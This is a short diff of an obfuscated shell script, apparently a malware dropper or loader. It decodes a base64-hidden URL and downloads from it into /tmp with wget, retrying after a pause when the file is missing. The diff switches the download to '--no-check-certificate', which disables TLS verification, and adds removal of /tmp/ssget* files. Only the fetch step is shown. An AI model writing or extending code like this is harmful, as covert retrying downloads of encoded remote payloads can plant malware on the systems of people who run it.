@@ -7,8 +7,10 @@ abc_start()
 abca=0
 abcb=1
 rm -f /tmp/abci*
+rm -f /tmp/ssget*
 abcd=`echo "$abcc" | base64 -d`
-wget -q -t 1 -O /tmp/abci $abcd
+#wget -q -t 1 -O /tmp/abci $abcd
+wget --no-check-certificate -q $abcd -O /tmp/abci
 if [ ! -f /tmp/abci ]; then
 	sleep 60
 	abc_keep
